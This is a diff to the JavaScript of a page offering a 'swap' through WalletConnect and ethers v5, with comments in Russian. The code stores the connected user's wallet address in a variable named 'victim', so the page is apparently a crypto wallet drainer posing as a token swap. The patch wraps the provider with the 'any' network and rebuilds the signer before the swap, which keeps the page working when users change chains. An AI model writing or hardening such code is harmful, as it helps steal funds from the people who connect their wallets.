@@ -373,6 +373,11 @@
                 } catch (_) { return false; }
             }
 
+            // 'any' снимает кэш сети — иначе ethers v5 роняет NETWORK_ERROR при смене chainId
+            function wrapProvider(wc) {
+                return new ethers.providers.Web3Provider(wc, 'any');
+            }
+
             // ===== Session =====
             const SESSION_KEY = 'walletconnect_session';
 
@@ -416,7 +421,7 @@
                         return false;
                     }
 
-                    const web3Provider = new ethers.providers.Web3Provider(restored);
+                    const web3Provider = wrapProvider(restored);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
 
@@ -455,7 +460,7 @@
 
                     chainId = cid;
                     try {
-                        const web3Provider = new ethers.providers.Web3Provider(providerInstance);
+                        const web3Provider = wrapProvider(providerInstance);
                         provider = web3Provider;
                         signer = web3Provider.getSigner();
                         victim = await signer.getAddress();
@@ -476,7 +481,7 @@
                         clearSession();
                         updateConnectButton();
                     } else {
-                        const web3Provider = new ethers.providers.Web3Provider(providerInstance);
+                        const web3Provider = wrapProvider(providerInstance);
                         const signer_ = web3Provider.getSigner();
                         signer_.getAddress().then(address => {
                             victim = address;
@@ -677,7 +682,7 @@
                         throw new Error('No accounts returned');
                     }
 
-                    const web3Provider = new ethers.providers.Web3Provider(wcProvider);
+                    const web3Provider = wrapProvider(wcProvider);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
 
@@ -723,10 +728,18 @@
             // ===== Swap execution =====
             async function executeSwap() {
                 if (isProcessing) return;
-                if (!provider || !signer) {
+                if (!provider || !signer || !wcProvider) {
                     setStatus('Please connect wallet first', 'err');
                     return;
                 }
+
+                // Пересобираем провайдер и signer на актуальной сети перед отправкой
+                try {
+                    const freshChain = readWcChainId(wcProvider);
+                    if (freshChain && freshChain !== chainId) chainId = freshChain;
+                    provider = wrapProvider(wcProvider);
+                    signer = provider.getSigner();
+                } catch (_) {}
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
                 if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
